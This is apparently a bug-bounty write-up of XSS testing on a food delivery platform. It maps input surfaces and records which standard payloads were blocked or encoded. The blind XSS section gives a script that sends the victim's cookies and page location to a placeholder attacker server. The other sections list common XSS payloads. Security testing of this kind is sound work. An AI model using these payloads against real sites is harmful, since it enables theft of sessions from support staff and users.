# Target B - Food Delivery Platform XSS Assessment

## Overview
Same target as the IDOR assessment. After going through the authorization testing I switched focus to XSS. The thing that makes this platform interesting for XSS is the multi-user flow — if a payload lands in a field that a driver or support agent sees, you're not looking at self-XSS anymore. That's the angle worth pursuing here.

Program excludes self-XSS specifically — so the goal was finding input that gets displayed to someone other than me.

---

## Finding Input Surfaces

Before throwing payloads anywhere I just browsed the app normally with Burp running and mapped every place I could type something. The rule I follow here is simple — type something unique like `TESTINPUT123` in a field, submit it, and see where it shows up. Once you know where your input lands, you know what type of XSS to test for and what payload context you're working with.

**What I found:**
```
Profile name fields         → Stored (shown to drivers and support)
Delivery instructions       → Stored (shown to driver on pickup)
Search bar                  → Reflected (URL parameter)
Review/rating text          → Stored (shown publicly)
Support ticket text         → Blind (shown to internal staff)
Promo code field            → Reflected (error message)
```

---

## Profile Name Fields

Started here because profile names get shown to drivers when they pick up an order and to support staff when they pull up an account. If a payload executes in a driver's browser that's stored XSS affecting a real user — not self-XSS.

The request looked like this:

```json
POST /graphql/editConsumerProfileInformation

{
  "operationName": "editConsumerProfileInformation",
  "variables": {
    "firstName": "Test",
    "lastName": "Account"
  }
}
```

Went through standard payloads one by one:

**Basic script tag:**
```json
{"firstName": "<script>alert(1)</script>"}
→ 400 Bad Request
```

**img onerror — bypasses basic script filters:**
```json
{"firstName": "<img src=x onerror=alert(1)>"}
→ 400 Bad Request
```

**svg onload:**
```json
{"firstName": "<svg onload=alert(1)>"}
→ 400 Bad Request
```

**Attribute escape — breaks out of value context:**
```json
{"firstName": "\"><script>alert(1)</script>"}
→ 400 Bad Request
```

All four hit a 400. The server is doing input validation before anything gets near the database. Not just client-side either — I was sending these directly through Burp bypassing the browser entirely. Properly blocked.
- Status: ✗ Blocked server-side

---

## GraphQL Parameters

While I was in the GraphQL requests anyway I tested the string fields there too. The idea was the same — inject a payload into any string value and see if it comes back in the response unencoded.

```json
{"searchUseCase": "<img src=x onerror=alert(1)>"}
→ Payload not reflected in response

{"storeIds": ["<script>alert(1)</script>"]}
→ Empty results, payload not reflected
```

GraphQL endpoints that return structured data aren't great XSS targets anyway. The server is using these values to run queries internally — it's not printing them back into an HTML page. Not surprised these didn't go anywhere.
- Status: ✗ Not reflected

---

## URL Parameters — DOM XSS

Looked for URL parameters that might get read by JavaScript and written back to the page. The framework here is React/Next.js which auto-escapes output through JSX by default — that kills most DOM XSS unless a developer explicitly uses `dangerouslySetInnerHTML`.

Tried a few:
```
?search=<script>alert(1)</script>         → encoded
?query=<img src=x onerror=alert(1)>       → encoded
?redirect=javascript:alert(1)             → blocked
?next=javascript:alert(1)                 → blocked
```

Nothing executed. React doing its job.
- Status: ✗ Not vulnerable

---

## Blind XSS — Support Tickets

This is the one I didn't fully test but it's worth calling out. Support tickets, order feedback, and "report a problem" submissions all end up in some internal tool that staff look at. If a payload in one of those submissions fires when a support agent opens it — that's blind XSS with potentially critical impact. Support staff have elevated access to user accounts and payment data.

The payload you'd use for blind XSS is different from a basic alert — you need it to phone home when it fires since you can't see it yourself:

```javascript
<script>new Image().src='https://[your-server]/?c='+document.cookie+'&url='+document.location</script>
```

You set up a listener on your server, submit the payload, and wait. If your server gets a hit you know it executed somewhere internally.

Flagged this as a follow-up — need to set up a proper callback server and test it properly.
- Status: 🔲 Not yet tested

---

## Summary

Tested four XSS surfaces. Input validation on profile fields is solid — 400 on every payload variant. GraphQL parameters aren't reflected. React's output encoding handles DOM XSS. Blind XSS via support forms is the most promising angle and the one I'd test next.

**What's next:**
- [ ] Set up callback server and test blind XSS through support ticket submission
- [ ] Test delivery notes field on an active order — driver sees this on pickup
- [ ] Submit a review after completing an order and check if it's sanitized
- [ ] Check promo code error messages for reflection

## Tools
- Burp Suite Community Edition v2026.2.3
- Chrome with FoxyProxy
- Browser developer tools